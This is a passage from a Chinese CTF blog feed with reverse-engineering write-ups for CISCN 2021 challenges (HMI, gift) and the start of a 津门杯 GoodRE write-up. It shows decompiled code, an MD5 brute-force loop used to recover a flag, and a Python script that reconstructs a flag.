class="string">&quot;62.1956&quot;</span>, <span class="string">&quot;62.19865&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;25.0002&quot;</span>, <span class="string">&quot;25.0155&quot;</span>, <span class="string">&quot;25.0308&quot;</span>, <span class="string">&quot;25.0461&quot;</span>, <span class="string">&quot;25.0614&quot;</span>, <span class="string">&quot;25.0767&quot;</span>, <span class="string">&quot;25.092&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;52.8016&quot;</span>, <span class="string">&quot;52.80465&quot;</span>, <span class="string">&quot;52.8077&quot;</span>, <span class="string">&quot;52.81075&quot;</span>, <span class="string">&quot;52.8138&quot;</span>, <span class="string">&quot;52.81685&quot;</span>, <span class="string">&quot;52.8199&quot;</span>, <span class="string">&quot;52.82295&quot;</span>, <span class="string">&quot;52.8260&quot;</span>, <span class="string">&quot;52.82905&quot;</span>, <span class="string">&quot;52.8321&quot;</span>, <span class="string">&quot;52.83515&quot;</span>, <span class="string">&quot;52.8382&quot;</span>, <span class="string">&quot;52.84125&quot;</span>, <span class="string">&quot;52.8443&quot;</span>, <span class="string">&quot;52.84735&quot;</span>, <span class="string">&quot;52.8504&quot;</span>, <span class="string">&quot;52.85345&quot;</span>, <span class="string">&quot;52.8565&quot;</span>, <span class="string">&quot;52.85955&quot;</span>, <span class="string">&quot;52.8626&quot;</span>, <span class="string">&quot;52.86565&quot;</span>, <span class="string">&quot;52.8687&quot;</span>, <span class="string">&quot;52.87175&quot;</span>, <span class="string">&quot;52.8748&quot;</span>, <span class="string">&quot;52.87785&quot;</span>, <span class="string">&quot;52.8809&quot;</span>, <span class="string">&quot;52.88395&quot;</span>, <span class="string">&quot;52.8870&quot;</span>, <span class="string">&quot;52.89005&quot;</span>, <span class="string">&quot;52.8931&quot;</span>, <span class="string">&quot;52.89615&quot;</span>, <span class="string">&quot;52.8992&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;406.6128&quot;</span>, <span class="string">&quot;406.6281&quot;</span>, <span class="string">&quot;406.6434&quot;</span>, <span class="string">&quot;406.6587&quot;</span>, <span class="string">&quot;406.674&quot;</span>, <span class="string">&quot;406.6893&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;22.0027&quot;</span>, <span class="string">&quot;22.00575&quot;</span>, <span class="string">&quot;22.0088&quot;</span>, <span class="string">&quot;22.01185&quot;</span>, <span class="string">&quot;22.0149&quot;</span>, <span class="string">&quot;22.01795&quot;</span>, <span class="string">&quot;22.0210&quot;</span>, <span class="string">&quot;22.02405&quot;</span>, <span class="string">&quot;22.0271&quot;</span>, <span class="string">&quot;22.03015&quot;</span>, <span class="string">&quot;22.0332&quot;</span>, <span class="string">&quot;22.03625&quot;</span>, <span class="string">&quot;22.0393&quot;</span>, <span class="string">&quot;22.04235&quot;</span>, <span class="string">&quot;22.0454&quot;</span>, <span class="string">&quot;22.04845&quot;</span>, <span class="string">&quot;22.0515&quot;</span>, <span class="string">&quot;22.05455&quot;</span>, <span class="string">&quot;22.0576&quot;</span>, <span class="string">&quot;22.06065&quot;</span>, <span class="string">&quot;22.0637&quot;</span>, <span class="string">&quot;22.06675&quot;</span>, <span class="string">&quot;22.0698&quot;</span>, <span class="string">&quot;22.07285&quot;</span>, <span class="string">&quot;22.0759&quot;</span>, <span class="string">&quot;22.07895&quot;</span>, <span class="string">&quot;22.0820&quot;</span>, <span class="string">&quot;22.08505&quot;</span>, <span class="string">&quot;22.0881&quot;</span>, <span class="string">&quot;22.09115&quot;</span>, <span class="string">&quot;22.0942&quot;</span>, <span class="string">&quot;22.09725&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;13.1121&quot;</span>, <span class="string">&quot;13.1274&quot;</span>, <span class="string">&quot;13.1427&quot;</span>, <span class="string">&quot;13.158&quot;</span>, <span class="string">&quot;13.1733&quot;</span>, <span class="string">&quot;13.1886&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;158.0031&quot;</span>, <span class="string">&quot;158.0184&quot;</span>, <span class="string">&quot;158.0337&quot;</span>, <span class="string">&quot;158.049&quot;</span>, <span class="string">&quot;158.0643&quot;</span>, <span class="string">&quot;158.0796&quot;</span>, <span class="string">&quot;158.0949&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;54.00025&quot;</span>, <span class="string">&quot;54.0033&quot;</span>, <span class="string">&quot;54.00635&quot;</span>, <span class="string">&quot;54.0094&quot;</span>, <span class="string">&quot;54.01245&quot;</span>, <span class="string">&quot;54.0155&quot;</span>, <span class="string">&quot;54.01855&quot;</span>, <span class="string">&quot;54.0216&quot;</span>, <span class="string">&quot;54.02465&quot;</span>, <span class="string">&quot;54.0277&quot;</span>, <span class="string">&quot;54.03075&quot;</span>, <span class="string">&quot;54.0338&quot;</span>, <span class="string">&quot;54.03685&quot;</span>, <span class="string">&quot;54.0399&quot;</span>, <span class="string">&quot;54.04295&quot;</span>, <span class="string">&quot;54.0460&quot;</span>, <span class="string">&quot;54.04905&quot;</span>, <span class="string">&quot;54.0521&quot;</span>, <span class="string">&quot;54.05515&quot;</span>, <span class="string">&quot;54.0582&quot;</span>, <span class="string">&quot;54.06125&quot;</span>, <span class="string">&quot;54.0643&quot;</span>, <span class="string">&quot;54.06735&quot;</span>, <span class="string">&quot;54.0704&quot;</span>, <span class="string">&quot;54.07345&quot;</span>, <span class="string">&quot;54.0765&quot;</span>, <span class="string">&quot;54.07955&quot;</span>, <span class="string">&quot;54.0826&quot;</span>, <span class="string">&quot;54.08565&quot;</span>, <span class="string">&quot;54.0887&quot;</span>, <span class="string">&quot;54.09175&quot;</span>, <span class="string">&quot;54.0948&quot;</span>, <span class="string">&quot;54.09785&quot;</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> size[<span class="number">8</span>] = &#123;<span class="number">33</span>, <span class="number">7</span>, <span class="number">33</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">MD5</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; src )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MD5_CTX ctx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> md5_string;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> md[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">33</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    MD5_Init( &amp;ctx );</span><br><span class="line">    MD5_Update( &amp;ctx, src.c_str(), src.size() );</span><br><span class="line">    MD5_Final( md, &amp;ctx );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">memset</span>( tmp, <span class="number">0x00</span>, <span class="keyword">sizeof</span>( tmp ) );</span><br><span class="line">        <span class="built_in">sprintf</span>( tmp, <span class="string">&quot;%02X&quot;</span>, md[i] );</span><br><span class="line">        md5_string += tmp;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> md5_string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; MD5(<span class="string">&quot;62.10105,25.0002,52.8016,406.6128,22.0027,13.1121,158.0031,54.00025,&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> cur[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">time_t</span> start = clock();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> <span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">2028571776</span>; ++i)&#123;</span><br><span class="line">        <span class="built_in">string</span> in = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">if</span> (cur[j] &gt;= size[j])&#123;</span><br><span class="line">                cur[j] = <span class="number">0</span>;</span><br><span class="line">                ++cur[j + <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            in += combine[j][cur[j]];</span><br><span class="line">            in += <span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> out = MD5(in);</span><br><span class="line">        cur[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; in &lt;&lt; endl;</span></span><br><span class="line">        <span class="keyword">if</span> (out[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; out[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; out[<span class="number">2</span>] == <span class="string">&#x27;B&#x27;</span> &amp;&amp; out[<span class="number">3</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; out[<span class="number">4</span>] == <span class="string">&#x27;7&#x27;</span> &amp;&amp; out[<span class="number">5</span>] == <span class="string">&#x27;8&#x27;</span> &amp;&amp; out[<span class="number">6</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">7</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">8</span>] == <span class="string">&#x27;B&#x27;</span> &amp;&amp; out[<span class="number">9</span>] == <span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in:&quot;</span> &lt;&lt; in &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;out:&quot;</span> &lt;&lt; out &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">5000000</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="number">100.0</span> * i / <span class="number">2028571776</span> &lt;&lt; <span class="string">&quot;%&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">time_t</span> end = clock();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;time=%fs\n&quot;</span>, (<span class="keyword">double</span>)(end - start)/CLOCKS_PER_SEC);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5是直接上网抄的，来源：<a href="https://blog.csdn.net/u012063703/article/details/49178349">https://blog.csdn.net/u012063703/article/details/49178349</a></p><p>最后的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">60.8803%</span><br><span class="line">in:62.1834,25.0002,52.84735,406.6893,22.01795,13.1886,158.0031,54.06125,</span><br><span class="line">out:F0B278CCB982F6132DD6A834C4827D0D</span><br><span class="line">61.1268%</span><br><span class="line">...</span><br><span class="line">time&#x3D;2639.569345s</span><br></pre></td></tr></table></figure><p>爆破出答案大概花了 $60\% \times 2640=26.4\min$</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>这题难度不在于逆向，前期的基本分析以及后面需要打数据动调这些和逆向有关的操作，比赛的时候其实都想到了，但问题在于不知道还有 Modbus Slave 这种东西</p><p>所以全程都很迷茫，完全不知道该怎么做，官方的提示早上才放出来，那会都收工准备补觉了（一个小时的时间，找数据范围+写脚本+爆破，根本来不及好吧）</p><p>以及过程中的调数据就是无限二分，累的一批，这题说是 Misc 我都信</p><p>最后的爆破数据量也太大了，参考的博客用go跑了两小时，我这边用c++跑了半个小时，不过队友用c的多线程只跑了半分钟，看截图只爆破了 $2\%$ 就出结果了，应该是划分的位置正好在答案边上，有时间学习一下多线程</p><p>综上：屑题</p><h1 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h1><p>新版本的GO对magic number以及一些结构上都做了修改，所以老版本的符号表修复脚本就不能用了，好在免费的ida7.6正好支持GO的符号表恢复，可以直接做了。</p><p>主函数主要部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">main_CISCN6666666();</span><br><span class="line">main_CISCN66666666();</span><br><span class="line">main_CISCN6666666666();</span><br><span class="line">max_len_v2 = qword_928238; <span class="comment">// 0x20</span></span><br><span class="line">index_v3 = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">while</span> ( (__int64)index_v3 &lt; max_len_v2 )</span><br><span class="line">&#123;</span><br><span class="line">  qword_9720E8 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( qword_928238 &lt;= index_v3 )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  v14 = off_928230[index_v3];</span><br><span class="line">  runtime_makeslice((__int64)<span class="string">&quot;\b&quot;</span>, v14, v14, v10);</span><br><span class="line">  v5 = (__int64 *)v11;</span><br><span class="line">  v19 = (__int64 *)v11;</span><br><span class="line">  v4 = <span class="number">1L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v4;</span><br><span class="line">    main_wtf(<span class="number">0L</span>L, v4, v5, v14, v14);</span><br><span class="line">    v4 = v12 + <span class="number">1</span>;</span><br><span class="line">    v5 = v19;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)qword_9720E8 &gt;= <span class="number">0x11</span> )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  v6 = *((_BYTE *)&amp;v16 + qword_9720E8);</span><br><span class="line">  v22[<span class="number">0</span>] = &amp;unk_8765E0;                       <span class="comment">// output_length</span></span><br><span class="line">  v22[<span class="number">1</span>] = &amp;qword_9239C0[v6 ^ <span class="number">0x66</span>u];         <span class="comment">// output</span></span><br><span class="line">  v8 = qword_92EAB0;</span><br><span class="line">  v10 = <span class="number">2L</span>L;</span><br><span class="line">  v1 = v22;</span><br><span class="line">  fmt_Fprintf(v0, (__int64)v22, (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_9239C0);</span><br><span class="line">  index_v3 += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开头的三个CISCN函数是简单的输出，中间生成空的slice然后扔到了wtf函数中，输出是根据索引，从<code>qword_9239C0</code>中选择一个字符。</p><p>尝试运行的时候发现运行时间很长，但在程序中没有看到延时的操作，那么这道题应该是一个耗时的算法。</p><p>观察发现 <code>wtf</code> 函数是一个递归函数，而 <code>off_928230</code> 中存的就是递归的深度。</p><p>尝试找规律，直接将深度patch成 <code>1</code> 到 <code>0x20</code>，运行一下。</p><p>得到如下结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome to CISCN 2021!</span><br><span class="line">Here is our free flag for you as a gift:</span><br><span class="line">CISCN&#123;45b3247c45b3247c4</span><br></pre></td></tr></table></figure><p>猜测最后的输出是有规律的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cur_time = [ </span><br><span class="line">    <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x14</span>, <span class="number">0x19</span>, <span class="number">0x1E</span>,</span><br><span class="line">    <span class="number">0x28</span>, <span class="number">0x42</span>, <span class="number">0x66</span>, <span class="number">0x0A0</span>, <span class="number">0x936</span>, <span class="number">0x3D21</span>, <span class="number">0x149A7</span>, <span class="number">0x243AC</span>, <span class="number">0x0CB5BE</span>, <span class="number">0x47DC61</span>, <span class="number">0x16C0F46</span>, </span><br><span class="line">    <span class="number">0x262C432</span>, <span class="number">0x4ACE299</span>, <span class="number">0x10FBC92A</span>, <span class="number">0x329ECDFD</span>, <span class="number">0x370D7470</span></span><br><span class="line">]</span><br><span class="line">res = [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;7&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;CISCN&#123;&#x27;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cur_time:</span><br><span class="line">    <span class="built_in">print</span> (res[c % <span class="built_in">len</span>(res)], end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;CISCN&#123;4b445b3247c45344c54c44734445452c&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>和最后的正确结果做个对比，发现一样。</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;glass&lt;/li&gt;
&lt;li&gt;baby_rc&lt;/li&gt;
&lt;li&gt;little_evil&lt;/li&gt;
&lt;li&gt;HMI&lt;/li&gt;
&lt;li&gt;gift&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;TODO: 研究gift&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="CISCN" scheme="https://s0uthwood.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>津门杯 GoodRE writeup</title>
    <link href="https://s0uthwood.github.io/2021/05/10/%E6%B4%A5%E9%97%A8%E6%9D%AF-GoodRE-writeup/"/>
    <id>https://s0uthwood.github.io/2021/05/10/%E6%B4%A5%E9%97%A8%E6%9D%AF-GoodRE-writeup/</id>
    <published>2021-05-09T18:32:59.000Z</published>
    <updated>2021-05-19T17:49:06.792Z</updated>
    
    <content type="html"><![CDATA[<p>和两位学长一起做出来的，总算是能在团队赛中做出来题了，结束了长达一个月的白给生涯，不容易啊</p><a id="more"></a><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>先拖到 ida 里进行静态分析</p><p>查看main函数，把变量定义和初始化删了，并将 <code>cin</code> 的东西命名为了 <code>input</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;&gt;&gt; &quot;</span>, a3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">64</span> ) &#123;</span><br><span class="line">    v3 = input;</span><br><span class="line">    v4 = &amp;unk_55A06D2D0020;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      v6 = hexstr2int(v3, <span class="number">8</span>);</span><br><span class="line">      v7 = v14;</span><br><span class="line">      sub_55A06D2CC408(&amp;v14[v5], v6);</span><br><span class="line">      sub_55A06D2CC408(&amp;v18[v5], <span class="number">17</span>);</span><br><span class="line">      v8 = v19;</span><br><span class="line">      sub_55A06D2CC408(&amp;v19[v5], *v4);</span><br><span class="line">      ++v3;</span><br><span class="line">      ++v4;</span><br><span class="line">      v5 += <span class="number">36L</span>L;</span><br><span class="line">    &#125; <span class="keyword">while</span> ( v3 != v21 );</span><br><span class="line">    sub_55A06D2CCB30(v14, v18, v9);</span><br><span class="line">    sub_55A06D2CCB30(v15, v18, v10);</span><br><span class="line">    sub_55A06D2CCB30(v16, v18, v11);</span><br><span class="line">    sub_55A06D2CCB30(v17, v18, v12);</span><br><span class="line">    <span class="keyword">while</span> ( !sub_55A06D2CCADC(v7, v8) ) &#123;</span><br><span class="line">      v7 += <span class="number">36</span>;</span><br><span class="line">      v8 += <span class="number">36</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == v18 ) &#123;</span><br><span class="line">        __printf_chk(<span class="number">1L</span>L, <span class="string">&quot;flag&#123;%s&#125;\n&quot;</span>, input);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单查看一下，发现输入长度为64，然后 <code>do while</code> 看起来是进行初始化，后面的四个连续函数应该是加密</p><p>同时确定这个应该是算法题，不涉及混淆之类的东西</p><p>于是查看一下 <code>v6=</code> 的那个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">hexstr2int</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span> </span>&#123;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(a0123456789abcd) + <span class="number">1</span>;             <span class="comment">// 17</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = v2 - <span class="number">1</span>;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  LODWORD(result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a0123456789abcd[i] != *v4; ++i ) &#123;<span class="comment">// input是0-f</span></span><br><span class="line">      <span class="keyword">if</span> ( i == v2 - <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result = (i + (v2 - <span class="number">1</span>) * result);           <span class="comment">// input转成int</span></span><br><span class="line">    <span class="keyword">if</span> ( ++v4 == &amp;a1[a2 - <span class="number">1</span> + <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现应该是将输入转换成了 <code>int</code>，而且输入的字符必须得在 <code>0123456789ABCDEF</code> 中</p><p>然后看一眼重复出现三次的 <code>sub_55A06D2CCB30</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_55A06D2CC408</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span> </span>&#123;</span><br><span class="line">  *(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(a1 + <span class="number">4</span>) = a2;</span><br><span class="line">  v2 = <span class="number">4L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> ) &#123;</span><br><span class="line">    v3 = v2 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + v2 + <span class="number">3</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !--v2 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = v2;</span><br><span class="line">LABEL_4:</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来就是简单的赋值，<code>a1</code> 的第一部分填写长度，第二部分存 <code>a2</code></p><p>初始化部分应该可以先不管了，去看加密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_55A06D2CCB30</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span> </span>&#123;</span><br><span class="line">  sub_55A06D2CCA13(v5, a1);</span><br><span class="line">  sub_55A06D2CCA13(v6, (a1 + <span class="number">36</span>));</span><br><span class="line">  